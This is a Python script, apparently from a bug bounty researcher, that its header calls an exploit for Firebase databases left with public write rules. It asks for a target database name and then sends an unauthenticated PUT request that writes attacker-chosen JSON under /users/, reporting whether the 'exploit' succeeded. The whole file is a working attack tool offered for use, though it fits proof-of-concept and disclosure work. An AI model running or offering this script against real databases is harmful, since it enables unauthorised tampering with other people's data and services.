#Contact:
'''
Muhammad Khizer Javed
Cyber Security Researcher & Bug Bounty Hunter
khizerjaved@securitybreached.org
https://www.linkedin.com/in/muhammad-khizer-javed/
http://whoami.securitybreached.org/
https://bugcrowd.com/MuhammadKhizerJaved
https://hackerone.com/khizer47
'''

#Thanks to Daniyal Nasir https://www.facebook.com/786daniyal for help.
'''
This is A simple Python Exploit to Write Data to Insecure/vulnerable firebase databases!
Commonly found inside Mobile Apps.
If the owner of the app have set the security rules as true for both "read" & "write" an attacker can probably dump database
and write his own data to firebase db.
'''

import requests

print("\n############# \"Firebase Database Permissions Vulnerability Exploit ############")
print("Usage: Add Your Target Database Name, File Name you want to create, and Your information to write.")
print("Than Visit The Given URL at the end. <-- Enjoy -->")
print("Read Full Blog about this at https://blog.securitybreached.org/2020/02/04/exploiting-insecure-firebase-database-bugbounty/")

site = raw_input("\nEnter Firebase Databse Name: ")
file = raw_input("\nEnter Your Filename: ")
site_url = "https://"+site+".firebaseio.com/users/"+file+".json"

name = raw_input("\nEnter your name: ")
email = raw_input("\nEnter your email: ")
blog = raw_input("\nEnter your Blog: ")

data = {"Exploit": "Successfull", "blog": blog, "email": email, "name": name}

response = requests.put(site_url,json=data)

print("\n")
if response.status_code == 200:
    print ('<-- .EXPLOIT SUCCESSFUL. -->')
    print ("Verify here: https://"+site+".firebaseio.com/users/"+file+".json")
elif response.status_code == 401:
    print ('NOT EXPLOITABLE.')
    print ('Reason: All Permissions Denied')
elif response.status_code == 404:
    print ('Database Not Found.')
    print ('Reason: Firebase DB Not Found')
else:
    print ('NOT EXPLOITABLE.')
    print ('Reason: Unknown Error')
print("\n")
